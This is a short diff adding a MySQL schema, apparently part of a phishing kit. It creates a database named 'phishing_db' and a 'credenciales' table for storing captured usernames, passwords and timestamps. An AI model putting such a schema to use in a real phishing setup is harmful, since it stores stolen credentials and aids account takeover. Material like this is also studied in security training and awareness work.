@@ -1,0 +1,9 @@
+CREATE DATABASE phishing_db;
+USE phishing_db;
+
+CREATE TABLE credenciales (
+  id INT AUTO_INCREMENT PRIMARY KEY,
+  usuario VARCHAR(255),
+  password VARCHAR(255),
+  fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
